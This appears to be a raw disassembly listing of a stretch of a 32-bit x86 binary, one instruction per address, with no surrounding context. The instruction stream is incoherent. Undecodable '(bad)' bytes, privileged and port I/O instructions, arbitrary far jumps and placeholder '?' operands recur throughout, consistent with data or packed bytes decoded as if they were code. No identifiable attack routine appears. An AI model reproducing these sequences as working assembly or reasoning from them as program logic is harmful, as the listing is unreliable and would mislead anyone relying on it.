  415585:	mov    DWORD PTR [ecx-0xe],esp
  415588:	aam    0xc0
  41558a:	std    
  41558b:	xor    eax,0x6d5debcd
  415590:	(bad)  
  415591:	xchg   edx,eax
  415592:	push   esi
  415593:	jle    0x415523
  415595:	test   eax,0xd872a828
  41559a:	stos   BYTE PTR es:[edi],al
  41559b:	jbe    0x4155ce
  41559d:	cmp    al,0xbd
  41559f:	jg     0x4155e9
  4155a1:	ss in  al,dx
  4155a3:	arpl   WORD PTR [ecx-0x2b],bp
  4155a6:	mov    edi,0x8eed8214
  4155ab:	lock lods eax,DWORD PTR ds:[esi]
  4155ad:	inc    esp
  4155ae:	pop    ds
  4155af:	push   cs
  4155b0:	jbe    0x4155fa
  4155b2:	sub    BYTE PTR [esi],dl
  4155b4:	xchg   ecx,eax
  4155b5:	push   ds
  4155b6:	pusha  
  4155b7:	or     ch,BYTE PTR [edx]
  4155b9:	outs   dx,BYTE PTR ds:[esi]
  4155ba:	std    
  4155bb:	inc    ecx
  4155bc:	not    BYTE PTR [edi+ebp*1]
  4155bf:	cmp    bh,BYTE PTR [esi]
  4155c1:	mov    eax,0x752c54dd
  4155c6:	xchg   ebp,eax
  4155c7:	and    BYTE PTR ds:0xbf789cd4,dh
  4155cd:	fild   DWORD PTR [esi]
  4155cf:	or     eax,0x550a3364
  4155d4:	mov    edx,0x6d1e0a19
  4155d9:	mov    cl,BYTE PTR [edx]
  4155db:	xor    esp,DWORD PTR [esi]
  4155dd:	push   ds
  4155de:	dec    eax
  4155df:	pop    ds
  4155e0:	rcr    DWORD PTR [esi+edi*4+0x56],cl
  4155e4:	out    dx,al
  4155e5:	rcr    BYTE PTR [edx-0x6b],cl
  4155e8:	xor    bh,BYTE PTR [edx+0x5b]
  4155eb:	cmp    eax,0xef6025a6
  4155f0:	adc    dl,BYTE PTR [ebx+ecx*1+0x7bce034]
  4155f7:	sub    DWORD PTR [ebp+eax*8-0x7544e7ff],0xfffffff1
  4155ff:	mov    ds:0x2195aa34,eax
  415604:	mov    bh,0x81
  415606:	popa   
  415607:	jns    0x4155af
  415609:	mov    ah,BYTE PTR [esi+0x392e658]
  41560f:	xchg   edx,eax
  415610:	mov    eax,0x5880e05
  415615:	in     eax,dx
  415616:	pop    edi
  415617:	fild   DWORD PTR [edi-0x2a56ba1a]
  41561d:	adc    BYTE PTR [ebx-0x53],al
  415620:	inc    ebp
  415621:	jg     0x415609
  415623:	into   
  415624:	fmul   QWORD PTR [eax+0x17d2d38e]
  41562a:	add    esi,DWORD PTR cs:[esi+0x7238675a]
  415631:	push   0x6
  415633:	into   
  415634:	lods   eax,DWORD PTR ds:[esi]
  415635:	push   esi
  415636:	in     eax,dx
  415637:	icebp  
  415638:	xor    eax,0xb0e3a676
  41563d:	sti    
  41563e:	mov    ah,0x48
  415640:	push   cs
  415641:	scas   eax,DWORD PTR es:[edi]
  415642:	sbb    DWORD PTR [edx+0x4d83a9d],esp
  415648:	mov    bh,0x81
  41564a:	mov    ds:0x58cf40b6,eax
  41564f:	inc    esp
  415650:	sub    ebx,0xffffffb6
  415653:	and    DWORD PTR [ebx+eiz*8-0x53fcaa2c],ebp
  41565a:	loope  0x415675
  41565c:	xlat   BYTE PTR ds:[ebx]
  41565d:	inc    ebx
  41565e:	and    BYTE PTR [ebx],al
  415660:	xlat   BYTE PTR ds:[ebx]
  415661:	xor    bl,BYTE PTR [edi+0x3]
  415664:	dec    ebp
  415665:	retf   
  415666:	or     ebx,DWORD PTR [edi+0x15f457bc]
  41566c:	fist   DWORD PTR [ebx+0x18]
  41566f:	push   edi
  415670:	cli    
  415671:	popf   
  415672:	sub    eax,0x69a58fde
  415677:	out    dx,eax
  415678:	sub    eax,0x1f00bfd1
  41567d:	sti    
  41567e:	xor    esi,DWORD PTR [esi]
  415680:	xor    al,0x7a
  415682:	push   ebp
  415683:	xor    BYTE PTR [esi-0x31],bh
  415686:	lahf   
  415687:	mov    BYTE PTR [edi+0x7419fdc],bl
  41568d:	test   BYTE PTR [ebx],0x7a
  415690:	xchg   ecx,eax
  415691:	adc    dh,BYTE PTR [edx]
  415693:	push   ecx
  415694:	aad    0x3
  415696:	push   ebp
  415697:	xlat   BYTE PTR ds:[ebx]
  415698:	inc    edi
  415699:	mov    BYTE PTR [edi],bl
  41569b:	adc    ecx,DWORD PTR [esi+ebp*1]
  41569e:	enter  0x8187,0xc6
  4156a2:	adc    eax,0x837adedc
  4156a7:	les    esp,FWORD PTR [edx]
  4156a9:	push   ebx
  4156aa:	aas    
  4156ab:	les    esp,FWORD PTR [ebx+0x6a]
  4156ae:	jno    0x415677
  4156b0:	(bad)  
  4156b2:	dec    ecx
  4156b3:	push   es
  4156b4:	fptan  
  4156b6:	aas    
  4156b7:	icebp  
  4156b8:	jo     0x415641
  4156ba:	mov    edi,0xf1eb9c0d
  4156bf:	inc    edx
  4156c0:	dec    esp
  4156c1:	xor    BYTE PTR [ebp+0x67d3bce5],bh
  4156c7:	nop
  4156c8:	sbb    al,0xea
  4156ca:	nop    DWORD PTR [eax+0x67670ad9]
  4156d1:	fcom   QWORD PTR ds:0x6f97a60a
  4156d7:	aam    0xd
  4156d9:	dec    edi
  4156da:	add    BYTE PTR [edx+ecx*2-0x6b],cl
  4156de:	(bad)  
  4156df:	retf   0x6e78
  4156e2:	popf   
  4156e3:	enter  0xf6f7,0xc9
  4156e7:	adc    ah,BYTE PTR [edx]
  4156e9:	std    
  4156ea:	add    al,0x13
  4156ec:	mov    edx,0xc094b91d
  4156f1:	sub    DWORD PTR [edi-0x25a6f231],ecx
  4156f7:	pop    edi
  4156f8:	ret    
  4156f9:	div    DWORD PTR [ecx-0x382b4a25]
  4156ff:	sbb    eax,edi
  415701:	pop    ds
  415702:	xchg   ebp,eax
  415703:	cs xchg edi,eax
  415705:	out    dx,eax
  415706:	fmul   st,st(5)
  415708:	int    0xcd
  41570a:	aaa    
  41570b:	jns    0x4156c6
  41570d:	xchg   edx,eax
  41570e:	imul   edi,edi,0xb1ccbc16
  415714:	ins    DWORD PTR es:[edi],dx
  415715:	stos   BYTE PTR es:[edi],al
  415716:	lahf   
  415717:	rcl    esi,1
  415719:	test   al,0xc7
  41571b:	fwait
  41571c:	cmp    edi,DWORD PTR [eax+0x18]
  41571f:	ret    0xa77
  415722:	inc    edi
  415723:	adc    eax,0x44a9dab5
  415728:	pop    eax
  415729:	fidivr DWORD PTR [eax+0x44]
  41572c:	sbb    BYTE PTR [eax],cl
  41572e:	(bad)  
  41572f:	sar    BYTE PTR [eax-0x7fc4c124],1
  415735:	mov    esp,0xb48056f8
  41573a:	aaa    
  41573b:	ror    bh,1
  41573d:	addr16 push edx
  41573f:	nop
  415740:	or     esi,DWORD PTR [eax-0x60]
  415743:	out    dx,al
  415744:	cmp    BYTE PTR [ebx],bh
  415746:	mov    ecx,0x121a13dc
  41574b:	sub    ebp,ebp
  41574d:	ffreep st(5)
  41574f:	sub    dl,BYTE PTR [esi+0x3d125e28]
  415755:	loopne 0x415796
  415757:	cmp    BYTE PTR [ebx-0x64],dh
  41575a:	leave  
  41575b:	(bad)  
  41575c:	mov    ecx,0xb19e7e3f
  415761:	and    cl,dh
  415763:	adc    BYTE PTR [edi+0x133b7fed],ah
  415769:	jne    0x415756
  41576b:	mov    eax,ds:0x795c4f9
  415770:	cli    
  415771:	adc    eax,ebx
  415773:	inc    eax
  415774:	add    bl,BYTE PTR [ecx]
  415776:	test   DWORD PTR [edi-0x56],edi
  415779:	(bad)  
  41577a:	xor    DWORD PTR [esi+ebp*4],ecx
  41577d:	sbb    ebp,DWORD PTR [eax-0x6ef09035]
  415783:	mov    eax,0x6c6c1c0b
  415788:	jns    0x41578a
  41578a:	std    
  41578b:	mov    cs,WORD PTR [eax+0x5d]
  41578e:	in     eax,dx
  41578f:	lahf   
  415790:	repz test DWORD PTR [eax-0x4f],esi
  415794:	test   al,0x2d
  415796:	push   ebx
  415797:	es loope 0x41574f
  41579a:	lods   al,BYTE PTR ds:[esi]
  41579b:	jge    0x41577c
  41579d:	shl    BYTE PTR [esi-0x2f],1
  4157a0:	add    al,0xcb
  4157a2:	outs   dx,DWORD PTR ds:[esi]
  4157a3:	test   BYTE PTR [eax],al
  4157a5:	cmp    BYTE PTR [esi-0x9],cl
  4157a8:	pop    ss
  4157a9:	jmp    0xd4ab:0x64869f59
  4157b0:	shl    BYTE PTR [eax+0x4e69d06c],1
  4157b6:	push   edx
  4157b7:	jne    0x41579d
  4157b9:	push   cs
  4157ba:	xchg   esp,eax
  4157bb:	stos   BYTE PTR es:[edi],al
  4157bc:	out    dx,eax
  4157bd:	push   esp
  4157be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157bf:	add    al,cl
  4157c1:	pop    es
  4157c2:	in     eax,dx
  4157c3:	mov    ebp,es
  4157c5:	jp     0x41576b
  4157c7:	mov    ebx,0x82d5fe66
  4157cc:	mov    al,0x99
  4157ce:	mov    ecx,0x505600a9
  4157d3:	jmp    DWORD PTR [ecx]
  4157d5:	arpl   WORD PTR [edx-0x61],bx
  4157d8:	mov    ?,eax
  4157da:	push   edi
  4157db:	jle    0x415797
  4157dd:	outs   dx,BYTE PTR ds:[esi]
  4157de:	pop    ebp
  4157df:	(bad)  
  4157e0:	out    dx,eax
  4157e1:	inc    edx
  4157e2:	mov    al,0xda
  4157e4:	lea    edi,[edi+0xb]
  4157e7:	std    
  4157e8:	mov    ds:0xb1456ccd,eax
  4157ed:	sub    al,0xbb
  4157ef:	dec    esp
  4157f0:	enter  0xd974,0xca
  4157f4:	pop    ds
  4157f5:	in     eax,0xd0
  4157f7:	fucomi st,st(1)
  4157f9:	dec    edi
  4157fa:	js     0x4157a3
  4157fc:	adc    ecx,edi
  4157fe:	inc    ebp
  4157ff:	iret   
  415800:	(bad)  
  415801:	sub    DWORD PTR [ebp+0x1f519417],ebp
  415807:	pop    edx
  415808:	rcr    BYTE PTR [edi+ebx*4+0x7b],cl
  41580c:	inc    ax
  41580e:	addr16 push ebx
  415810:	fucom  st(2)
  415812:	icebp  
  415813:	(bad)  
  415814:	push   esp
  415815:	add    DWORD PTR [edx+0x3491565b],edx
  41581b:	(bad)  
  41581c:	(bad)  [edx-0x25f71386]
  415822:	xchg   ebp,eax
  415823:	jmp    edi
  415825:	lock dec ebp
  415827:	pop    esi
  415828:	xchg   edx,eax
  415829:	jo     0x41580b
  41582b:	mov    es,WORD PTR [edi-0x6f575d49]
  415831:	(bad)  
  415832:	jo     0x4157e3
  415834:	mov    ds:0xab3e5410,eax
  415839:	xchg   esi,eax
  41583a:	bnd call 0xa6309196
  415840:	mov    WORD PTR [ecx-0x41],?
  415843:	mov    ds:0x20f93beb,eax
  415848:	fisttp QWORD PTR [ecx+0x5]
  41584b:	mov    ebp,0x2bc19eb4
  415850:	fisub  DWORD PTR [ebx-0x2a8cba60]
  415856:	std    
  415857:	stos   DWORD PTR es:[edi],eax
  415858:	mov    ebx,0x67cf7891
  41585d:	scas   eax,DWORD PTR es:[edi]
  41585e:	xchg   ebp,eax
  41585f:	std    
  415860:	lahf   
  415861:	call   0x15a6:0x95cf0167
  415868:	inc    esi
  415869:	mov    eax,?
  41586b:	mov    al,ds:0x68fcccc1
  415870:	xchg   esi,eax
  415871:	sub    esi,DWORD PTR [ebp-0x1e]
  415874:	jmp    0x415899
  415876:	xlat   BYTE PTR ds:[ebx]
  415877:	cmp    DWORD PTR [ebp+0x11],eax
  41587a:	sub    BYTE PTR [ecx+0x410548a0],ch
  415880:	cmc    
  415881:	sub    al,0x8f
  415883:	ja     0x415874
  415885:	(bad)
  41588a:	cmp    DWORD PTR [eax-0x1f],ecx
  41588d:	inc    ecx
  41588e:	stos   DWORD PTR es:[edi],eax
  41588f:	fwait
  415890:	movq   QWORD PTR [edx],mm5
  415893:	test   BYTE PTR [ebx+0x67cc55d8],bl
  415899:	out    0x4,al
  41589b:	mov    dh,0x58
  41589d:	jne    0x4158e2
  41589f:	les    esi,FWORD PTR [edi+0x31def015]
  4158a5:	dec    esi
  4158a6:	sahf   
  4158a7:	and    ah,ah
  4158a9:	xor    eax,0x55699a73
  4158ae:	jo     0x41585e
  4158b0:	leave  
  4158b1:	fdiv   DWORD PTR [esi+0x325c7294]
  4158b7:	ret    0x42e4
  4158ba:	sar    edi,cl
  4158bc:	inc    edi
  4158bd:	shl    BYTE PTR [eax-0x691b03b],cl
  4158c3:	iret   
  4158c4:	xor    eax,DWORD PTR [eax]
  4158c6:	cmp    eax,0x46085787
  4158cb:	pop    edi
  4158cc:	popf   
  4158cd:	dec    edi
  4158ce:	popf   
  4158cf:	sar    ah,1
  4158d1:	inc    edx
  4158d2:	data16 repz js 0x415862
  4158d6:	es adc dl,bl
  4158d9:	and    ah,cl
  4158db:	cdq    
  4158dc:	ja     0x415944
  4158de:	jno    0x415924
  4158e0:	fmulp  st(6),st
  4158e2:	aaa    
  4158e3:	xchg   ebp,eax
  4158e4:	and    DWORD PTR [ecx],edx
  4158e6:	retf   0x2d5b
  4158e9:	pop    esi
  4158ea:	mov    ecx,0x6d0e9be4
  4158ef:	add    al,0xf2
  4158f1:	pop    eax
  4158f2:	mov    al,0x94
  4158f4:	mov    esp,0x6f436329
  4158f9:	ret    0x58c9
  4158fc:	sub    edx,DWORD PTR [edi-0x8d4a9a0]
  415902:	icebp  
  415903:	(bad)
  415907:	or     ecx,DWORD PTR [ebx]
  415909:	or     al,0x87
  41590b:	clc    
  41590c:	dec    ebp
  41590d:	fiadd  DWORD PTR [ecx-0x3ed8fdc2]
  415913:	out    dx,al
  415914:	cmp    eax,0x3692c67b
  415919:	inc    esp
  41591a:	enter  0x5f3,0x58
  41591e:	sub    eax,DWORD PTR [edx]
  415920:	int    0xe6
  415922:	mov    esp,0x74fe1245
  415927:	and    al,0x2f
  415929:	stc    
  41592a:	or     BYTE PTR [ecx],cl
  41592c:	xchg   DWORD PTR [esi-0x135502f4],ebp
  415932:	popf   
  415933:	xor    cl,al
  415935:	add    dl,BYTE PTR [eax-0x28]
  415938:	jg     0x41596d
  41593a:	jmp    0x78f8:0x26b2f27c
  415941:	aad    0x79
  415943:	mov    esp,0xa31f9906
  415948:	int3   
  415949:	(bad)  
  41594a:	test   eax,0x2347328d
  41594f:	or     al,0x75
  415951:	push   0x91294f1c
  415956:	add    DWORD PTR [edx+edx*8-0x62534f2b],edx
  41595d:	push   eax
  41595e:	pop    es
  41595f:	rcr    BYTE PTR [ebx+0x23],1
  415962:	repnz lods eax,DWORD PTR ds:[esi]
  415964:	in     al,dx
  415965:	push   ds
  415966:	aad    0x31
  415968:	jmp    0xe58ca6ea
  41596d:	scas   al,BYTE PTR es:[edi]
  41596e:	xchg   ebp,eax
  41596f:	inc    edi
  415970:	sub    edi,eax
  415972:	or     esp,eax
  415974:	cmp    esp,DWORD PTR [ecx+0x34]
  415977:	jmp    0x4158fd
  415979:	mov    edx,0x9d3203f0
  41597e:	fisttp QWORD PTR [ebp-0x43]
  415981:	mov    ds:0xe1880002,eax
  415986:	mov    ecx,DWORD PTR [esi-0x5ed03bdd]
  41598c:	pusha  
  41598d:	adc    bl,cl
  41598f:	aaa    
  415990:	pop    ds
  415991:	or     bl,BYTE PTR [edx+esi*4]
  415994:	mov    bl,0x94
  415996:	dec    ebx
  415997:	popf   
  415998:	pop    esi
  415999:	and    DWORD PTR [esi+esi*2+0x33c59c0c],edx
  4159a0:	int    0xce
  4159a2:	in     eax,dx
  4159a3:	imul   ebp,DWORD PTR [ecx-0x2c],0x883c3d6e
  4159aa:	fldenv [esi+0x6ea8297f]
  4159b0:	sub    esp,DWORD PTR [esi+eiz*4-0x24]
  4159b4:	push   ebx
  4159b5:	retf   0xa28c
  4159b8:	add    bh,al
  4159ba:	and    DWORD PTR [edx+0x41333283],esi
  4159c0:	outs   dx,BYTE PTR ds:[esi]
  4159c1:	and    ah,BYTE PTR [ebp+0x23]
  4159c4:	loop   0x4159fa
  4159c6:	cwde   
  4159c7:	inc    edx
  4159c8:	loope  0x4159f1
  4159ca:	(bad)  
  4159cb:	push   ecx
  4159cc:	fsub   QWORD PTR [ebx+0x2c]
  4159cf:	lea    esp,[edi+0x3651d1c8]
  4159d5:	xchg   ebx,eax
  4159d6:	push   es
  4159d7:	adc    ch,BYTE PTR [edi]
  4159d9:	jbe    0x415a4d
  4159db:	shr    DWORD PTR [esi],cl
  4159dd:	scas   al,BYTE PTR es:[edi]
  4159de:	push   cs
  4159df:	lock sbb BYTE PTR [ecx+0x7],cl
  4159e3:	add    al,0xc1
  4159e5:	push   DWORD PTR [esi]
  4159e7:	mov    cl,0x26
  4159e9:	das    
  4159ea:	or     BYTE PTR [edi-0x70c4aa63],dl
  4159f0:	lock sub BYTE PTR [edi+0x66],dh
  4159f4:	push   esp
  4159f5:	pop    ss
  4159f6:	repz push ds
  4159f8:	push   esp
  4159f9:	in     eax,0x44
  4159fb:	aam    0x37
  4159fd:	pop    ebp
  4159fe:	repz cmp ch,BYTE PTR [esi]
  415a01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a02:	xchg   esi,eax
  415a03:	mov    ?,WORD PTR [edx-0x1c]
  415a06:	in     eax,0x67
  415a08:	loop   0x415a0a
  415a0a:	dec    esp
  415a0b:	xchg   ebp,eax
  415a0c:	retf   
  415a0d:	and    bh,dh
  415a0f:	ret    
  415a10:	inc    edx
  415a11:	inc    edi
  415a12:	es js  0x4159ef
  415a15:	cmp    bl,BYTE PTR [esi]
  415a17:	mov    dl,cl
  415a19:	push   eax
  415a1a:	pop    ds
  415a1b:	jge    0x4159a4
  415a1d:	retf   0x2ee
  415a20:	jnp    0x415a73
  415a22:	into   
  415a23:	and    DWORD PTR [edi+0x143ecf24],ecx
  415a29:	mov    DWORD PTR [ecx+0x2f],ebp
  415a2c:	aam    0x47
  415a2e:	cld    
  415a2f:	ficomp DWORD PTR [ebx]
  415a31:	popf   
  415a32:	and    dh,bh
  415a34:	fidivr WORD PTR [edi-0x48a2169d]
  415a3a:	jne    0x415a8f
  415a3c:	ret    0x36a4
  415a3f:	cmp    ecx,DWORD PTR [edx+ebx*4+0x35]
  415a43:	mov    ecx,?
  415a45:	dec    eax
  415a46:	inc    ebp
  415a47:	jno    0x415a3c
  415a49:	ja     0x4159eb
  415a4b:	cwde   
  415a4c:	repz cld 
  415a4e:	ins    DWORD PTR es:[edi],dx
  415a4f:	jl     0x415a25
  415a51:	retf   0xecb2
  415a54:	xor    DWORD PTR [esi],ebp
  415a56:	test   al,0x6d
  415a58:	add    edi,DWORD PTR [edi-0x4004a783]
  415a5e:	rol    ch,0xb0
  415a61:	push   ds
  415a62:	sbb    esp,DWORD PTR [edi]
  415a64:	xor    eax,edx
  415a66:	pushf  
  415a67:	adc    edi,DWORD PTR [eax+ecx*1+0x15]
  415a6b:	mov    edx,gs
  415a6d:	and    DWORD PTR [ebp+ecx*1-0x74],ebx
  415a71:	lods   eax,DWORD PTR ds:[esi]
  415a72:	fadd   st(5),st
  415a74:	dec    edi
  415a75:	mov    BYTE PTR [esp+eiz*4-0x7269d54d],dh
  415a7c:	jne    0x415a71
  415a7e:	xor    al,dl
  415a80:	stc    
  415a81:	aas    
  415a82:	hlt    
  415a83:	cmp    DWORD PTR [ebp+0x32],esp
  415a86:	nop
  415a87:	mov    ebp,0x6508ef11
  415a8c:	or     eax,ebx
  415a8e:	iret   
  415a8f:	fisttp DWORD PTR [ebx]
  415a91:	push   ds
  415a92:	pop    edi
  415a93:	das    
  415a94:	add    DWORD PTR [eax+0x4f2343a5],ecx
  415a9a:	xor    eax,0x41c6e4e1
  415a9f:	jmp    0x3a00a600
  415aa4:	adc    cl,BYTE PTR [ebp+0x35f46f13]
  415aaa:	mov    ebp,0x7f1fe79b
  415aaf:	adc    bh,ah
  415ab1:	and    ebx,DWORD PTR [eax-0x35e54f07]
  415ab7:	push   0x25
  415ab9:	imul   ecx,edx,0x41
  415abc:	stc    
  415abd:	fstp   QWORD PTR [ecx]
  415abf:	aad    0x6e
  415ac1:	mov    edi,0xe7697726
  415ac6:	fs push ss
  415ac8:	xchg   DWORD PTR [ebx-0xf],ebx
  415acb:	loop   0x415a55
  415acd:	push   ecx
  415ace:	mov    bh,BYTE PTR [eax+0x13b87ddf]
  415ad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ad5:	jmp    0x415a68
  415ad7:	fsub   DWORD PTR ds:0xb0163850
  415add:	aad    0x41
  415adf:	retf   
  415ae0:	mov    ebp,0x2e542ece
  415ae5:	inc    eax
  415ae6:	xor    BYTE PTR [ebp-0x5af109ef],dl
  415aec:	xor    DWORD PTR [ecx-0x38],edi
  415aef:	jne    0x415b34
  415af1:	mov    al,BYTE PTR [esi+edi*2]
  415af4:	cdq    
  415af5:	push   ebp
  415af6:	jno    0x415ac3
  415af8:	out    0x5b,eax
  415afa:	out    dx,al
  415afb:	push   ecx
  415afc:	fimul  DWORD PTR [edi-0x30802200]
  415b02:	jno    0x415a8e
  415b04:	icebp  
  415b05:	mov    dh,0xa4
  415b07:	cmpps  xmm3,XMMWORD PTR [edx-0x5b],0x6c
  415b0c:	pop    ebx
  415b0d:	xlat   BYTE PTR ds:[ebx]
  415b0e:	jg     0x415b72
  415b10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b11:	jb     0x415aaf
  415b13:	clc    
  415b14:	dec    edx
  415b15:	and    eax,0xea8ac048
  415b1a:	(bad)  
  415b1b:	icebp  
  415b1c:	cdq    
  415b1d:	imul   esi,DWORD PTR ds:0x9a202a7c,0x30802e4c
  415b27:	and    al,0xf0
  415b29:	leave  
  415b2a:	xchg   esp,eax
  415b2b:	cmp    eax,0x9bc6168b
  415b30:	(bad)  
  415b32:	mov    ah,0x88
  415b34:	in     al,0xb9
  415b36:	jae    0x415b50
  415b38:	inc    edi
  415b39:	mov    ?,WORD PTR [edx+0x707e217a]
  415b3f:	xor    DWORD PTR [ebp+0x2d],esi
  415b42:	call   0x86d0:0x1a5513ea
  415b49:	sti    
  415b4a:	xlat   BYTE PTR ds:[ebx]
  415b4b:	cwde   
  415b4c:	pushf  
  415b4d:	xchg   edi,eax
  415b4e:	inc    edi
  415b4f:	xchg   ecx,eax
  415b50:	adc    al,0x59
  415b52:	mov    fs,WORD PTR [edx]
  415b54:	fisttp WORD PTR [ecx+eax*1-0x6fff4e19]
  415b5b:	jae    0x415b6d
  415b5d:	or     BYTE PTR [ecx],0x6
  415b60:	test   edx,ebp
  415b62:	xchg   ebp,eax
  415b63:	adc    BYTE PTR [ecx-0x7],bl
  415b66:	cmp    BYTE PTR [eax-0x561d6884],0xc3
  415b6d:	sti    
  415b6e:	or     eax,0x4b58b9b2
  415b73:	or     eax,0xbb4f2908
  415b78:	nop
  415b79:	rcr    DWORD PTR [ebx],cl
  415b7b:	inc    DWORD PTR [eax]
  415b7d:	out    dx,al
  415b7e:	aas    
  415b7f:	mov    eax,ds:0xf2335efb
  415b84:	sets   BYTE PTR [ebp+0x31]
  415b88:	add    edi,DWORD PTR [ecx+0x43381b68]
  415b8e:	lahf   
  415b8f:	cs push ds
  415b91:	(bad)  
  415b92:	mov    ebx,0xa3764b59
  415b97:	push   ebx
  415b98:	mov    ebp,0x3fc2bb67
  415b9d:	sbb    DWORD PTR [eax-0x5f],ecx
  415ba0:	fadd   DWORD PTR [ebx+0xb]
  415ba3:	into   
  415ba4:	and    DWORD PTR [ebp+0x4ac23c62],0xffffffd4
  415bab:	sbb    edx,DWORD PTR [ecx*2-0x3c875b5f]
  415bb2:	mov    ebp,0xb11ae9c2
  415bb7:	push   edi
  415bb8:	jge    0x415bf0
  415bba:	mov    ebp,0xe46daca2
  415bbf:	add    eax,0xf32e16d9
  415bc4:	dec    ebp
  415bc5:	scas   eax,DWORD PTR es:[edi]
  415bc6:	das    
  415bc7:	and    al,0x27
  415bc9:	shr    DWORD PTR [edx],0xa9
  415bcc:	pusha  
  415bcd:	mov    WORD PTR [ebx+edx*2],es
  415bd0:	jne    0x415bee
  415bd2:	xlat   BYTE PTR ds:[ebx]
  415bd3:	out    0x88,eax
  415bd5:	ja     0x415bb4
  415bd7:	jnp    0x415bba
  415bd9:	add    al,0x1f
  415bdb:	lods   eax,DWORD PTR ds:[esi]
  415bdc:	aaa    
  415bdd:	xchg   BYTE PTR [ebp+0x5cb384a3],cl
  415be3:	xchg   esi,eax
  415be4:	mov    al,ds:0x75a0d3fd
  415be9:	mov    ah,BYTE PTR [edi+0x7a]
  415bec:	sbb    DWORD PTR [edi+0x46],edi
  415bef:	gs repnz ror bh,1
  415bf3:	jbe    0x415bca
  415bf5:	jmp    0xf359:0x4ee944ee
  415bfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bfd:	(bad)
  415c01:	lock cmp al,0x93
  415c04:	xor    DWORD PTR [edi],edx
  415c06:	and    edx,DWORD PTR [ecx+0x74]
  415c09:	mov    al,ds:0xd7e387c4
  415c0e:	ror    DWORD PTR [ebx+0x2c],0x9b
  415c12:	shr    ah,1
  415c14:	pop    ds
  415c15:	stos   BYTE PTR es:[edi],al
  415c16:	jg     0x415bd6
  415c18:	mov    ds:0xc7e6b759,al
  415c1d:	mov    eax,ebp
  415c1f:	lods   eax,DWORD PTR ds:[esi]
  415c20:	mov    ch,0xfe
  415c22:	inc    ecx
  415c23:	sub    cl,cl
  415c25:	idiv   DWORD PTR [edi]
  415c27:	test   eax,0x5aff6f3
  415c2c:	je     0x415bf3
  415c2e:	pop    eax
  415c2f:	sbb    al,0x7e
  415c31:	jno    0x415ca2
  415c33:	sbb    DWORD PTR [edx+edx*2+0x71005b5],edx
  415c3a:	inc    esp
  415c3b:	adc    BYTE PTR ds:0x77435eea,0xe9
  415c42:	ja     0x415bc4
  415c44:	xchg   esp,eax
  415c45:	enter  0xe26,0x62
  415c49:	pop    edi
  415c4a:	adc    al,0xa3
  415c4c:	out    0x3c,al
  415c4e:	mov    ebx,0xc649f967
  415c53:	or     DWORD PTR [ebp+0x6216dfc4],0x5c9c41e5
  415c5d:	inc    BYTE PTR [esi]
  415c5f:	jle    0x415ca4
  415c61:	push   ds
  415c62:	sbb    eax,DWORD PTR [esp+edi*8+0x29]
  415c66:	pop    edx
  415c67:	lods   eax,DWORD PTR ds:[esi]
  415c68:	fisttp QWORD PTR [edx+0x5b]
  415c6b:	cmp    ebp,DWORD PTR [eax]
  415c6d:	push   eax
  415c6e:	rcl    DWORD PTR [edx+0x7b],1
  415c71:	xor    ebx,DWORD PTR [edx]
  415c73:	push   ds
  415c74:	shl    DWORD PTR [edx+0x38],1
  415c77:	and    eax,0xd333c867
  415c7c:	pop    esp
  415c7d:	or     DWORD PTR [esi+0xc0b2ec8],ecx
  415c83:	jle    0x415ced
  415c85:	inc    eax
  415c86:	jg     0x415c0b
  415c88:	jno    0x415c7d
  415c8a:	mov    bh,0xb
  415c8c:	jge    0x415d07
  415c8e:	fst    DWORD PTR [bx+di]
  415c91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c92:	paddusb mm2,QWORD PTR [eax-0x26]
  415c96:	dec    edi
  415c97:	add    bl,al
  415c99:	addr16 xor eax,0xcf0205f9
  415c9f:	fdiv   DWORD PTR [ebx+0x2c]
  415ca2:	push   cs
  415ca3:	push   cs
  415ca4:	xchg   ebx,eax
  415ca5:	fimul  DWORD PTR [esi+esi*1+0x3b24801b]
  415cac:	div    ah
  415cae:	sub    DWORD PTR [esi],0x282db37
  415cb4:	daa    
  415cb5:	pop    es
  415cb6:	jp     0x415c9f
  415cb8:	or     eax,0x86b8ae1d
  415cbd:	and    eax,0x41378963
  415cc2:	or     DWORD PTR [ecx],0xf387f2d2
  415cc8:	jb     0x415d3d
  415cca:	jecxz  0x415c94
  415ccc:	ins    DWORD PTR es:[edi],dx
  415ccd:	(bad)  [edx-0x4d4b3f2b]
  415cd3:	push   ebx
  415cd4:	adc    DWORD PTR [ebx-0x1dd2d494],0xb
  415cdb:	sbb    DWORD PTR ds:0xc0d9908,edi
  415ce1:	push   esp
  415ce2:	mov    ds:0x9d482e0f,al
  415ce7:	dec    edi
  415ce8:	dec    ebx
  415ce9:	test   al,0x35
  415ceb:	push   ebp
  415cec:	jne    0x415ce5
  415cee:	jp     0x415cd9
  415cf0:	popa   
  415cf1:	adc    ecx,eax
  415cf3:	or     DWORD PTR [esi-0x2eb45351],ecx
  415cf9:	stos   DWORD PTR es:[edi],eax
  415cfa:	push   esp
  415cfb:	inc    edi
  415cfc:	dec    ecx
  415cfd:	mov    cs,WORD PTR [edx+0x5489d74]
  415d03:	push   edx
  415d04:	add    al,0x7
  415d06:	pop    ss
  415d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d08:	and    ebp,edx
  415d0a:	jne    0x415d46
  415d0c:	gs jmp 0x415d07
  415d0f:	inc    edx
  415d10:	lods   al,BYTE PTR ds:[esi]
  415d11:	adc    al,al
  415d13:	xor    eax,DWORD PTR [esi]
  415d15:	scas   al,BYTE PTR es:[edi]
  415d16:	push   0xd9e264f3
  415d1b:	mov    bh,bh
  415d1d:	jle    0x415d5e
  415d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d20:	add    al,0x95
  415d22:	std    
  415d23:	scas   al,BYTE PTR es:[edi]
  415d24:	test   BYTE PTR [edi+0x1003d397],ch
  415d2a:	fidiv  WORD PTR [ecx+0x3a]
  415d2d:	xor    al,bh
  415d2f:	xor    DWORD PTR [edi],edi
  415d31:	push   eax
  415d32:	pushf  
  415d33:	push   edx
  415d34:	sub    DWORD PTR [ecx+ebp*1],0xb459a61e
  415d3b:	jne    0x415d27
  415d3d:	fld    QWORD PTR [esi+0x70]
  415d40:	jne    0x415cdb
  415d42:	sti    
